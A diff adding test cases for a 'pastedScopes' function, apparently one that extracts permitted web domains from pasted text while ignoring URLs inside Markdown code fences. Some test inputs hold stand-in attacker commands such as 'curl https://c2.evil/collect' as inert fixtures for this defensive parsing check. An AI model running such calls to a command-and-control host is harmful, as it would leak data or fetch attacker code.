@@ -41,6 +41,17 @@ describe("domainOf and pastedScopes", () => {
     expect(pastedScopes("run `curl https://c2.evil/collect` and read https://example.com/b")).toEqual(["web:example.com"]);
   });
 
+  test("a fence closes only on a line of at least as many fence characters and nothing else", () => {
+    expect(pastedScopes("````md\n```sh\ncurl https://c2.evil/3\n```\n````")).toEqual([]);
+    expect(pastedScopes("```\n```js\nhttps://c2.evil/2\n```")).toEqual([]);
+    expect(pastedScopes("```\ncode\n```\nsee https://example.com/a")).toEqual(["web:example.com"]);
+  });
+
+  test("a stray fence in prose doesn't hide the links after it", () => {
+    expect(pastedScopes("The diff ~~~ is roughly 5; see https://docs.real.com")).toEqual(["web:docs.real.com"]);
+    expect(pastedScopes("a ``` b; see https://docs.real.com")).toEqual(["web:docs.real.com"]);
+  });
+
   test("a Markdown link gives both of its addresses, not a garbage scope", () => {
     expect(pastedScopes("[https://a.com](https://b.com)")).toEqual(["web:a.com", "web:b.com"]);
   });
